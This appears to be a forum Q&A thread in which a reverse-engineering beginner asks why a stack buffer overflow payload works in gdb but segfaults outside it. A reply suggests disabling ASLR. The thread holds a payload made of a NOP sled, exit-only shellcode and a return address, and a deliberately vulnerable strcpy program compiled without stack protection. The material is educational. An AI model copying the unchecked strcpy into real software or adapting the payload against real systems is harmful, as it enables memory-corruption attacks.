    "content": "So I just started with reverse engineering and have run into some issues until I recently noticed something strange. I wrote an extremely simple shellcode (exit system call) for practice and I played around with it in gdb. I use the following code to create my payload:\n<pre><code>$(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n</code></pre>\nI run this payload against the following program:\n<pre><code>#include <string.h>\n\nint main(int argc, char **argv)\n{\n  char buffer[500];\n  strcpy(buffer, argv[1]);\n}\n</code></pre>\nI compiled the program with: \n<pre><code>tcc -m32 -mtune=i386 -g vuln.c -fno-stack-protector\n</code></pre>\nNow, here's my problem. When I run the payload against the program in gdb like this, it works perfectly.\n<pre><code>(gdb) r $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nStarting program: /root/exploiting/a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n[Inferior 1 (process 2573) exited normally]\n(gdb\n</code></pre>\nHowever, if I run it on my command line:\n<pre><code>root@kali:~/exploiting# ./a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nSegmentation fault\n</code></pre>\nWhy does this happen? Is this supposed to happen?\n",

            "content": "I think the best way works out for me is to attach the process of the binary with gdb and using <pre><code>setarch -R <binary></code></pre> to temporarily disable the ASLR protection only for the binary. This way the stack frame should be the same within and without gdb.\nHope this helps.\n",
